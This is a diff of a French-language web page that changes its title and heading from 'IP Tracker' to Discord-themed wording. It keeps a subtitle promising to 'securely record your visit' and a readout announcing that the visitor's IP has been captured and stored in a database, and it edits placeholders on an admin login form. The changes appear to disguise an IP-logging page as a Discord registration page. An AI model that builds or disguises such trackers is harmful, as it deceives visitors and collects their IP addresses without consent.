@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Tracker</title>
+    <title>Enregistrer la connection Discord</title>
     <style>
         * {
             margin: 0;
@@ -396,7 +396,7 @@
     <div class="container">
         <!-- SECTION 1: Discord - Design Vercel -->
         <div id="discordSection" class="section active">
-            <h1>IP Tracker</h1>
+            <h1>Discord Speudo</h1>
             <p class="subtitle">Enregistrez votre visite de manière sécurisée</p>
             
             <div id="discordError" class="message error"></div>
@@ -424,7 +424,7 @@
                 <div class="notification-line success">> IP RÉCUPÉRÉE AVEC SUCCÈS</div>
                 <div class="notification-line">> ADRESSE: <span class="highlight" id="ipNotif">XXX.XXX.XXX.XXX</span></div>
                 <div class="notification-line">> UTILISATEUR: <span class="highlight" id="userNotif">---</span></div>
-                <div class="notification-line success">> STOCKÉE DANS LA BASE DE DONNÉES</div>
+                <div class="notification-line success">> IP STOCKÉE DANS LA BASE DE DONNÉES</div>
                 <div class="notification-line">> CONNEXION ÉTABLIE</div>
             </div>
             
@@ -446,12 +446,12 @@
             
             <div class="form-group">
                 <label>👤 Identifiant</label>
-                <input type="text" id="usernameInput" placeholder="root">
+                <input type="text" id="usernameInput" placeholder="username">
             </div>
             
             <div class="form-group">
                 <label>🔑 Mot de passe</label>
-                <input type="password" id="passwordInput" placeholder="••••••••">
+                <input type="password" id="passwordInput" placeholder="password">
             </div>
             
             <button onclick="loginAdminFunc()">Se connecter</button>
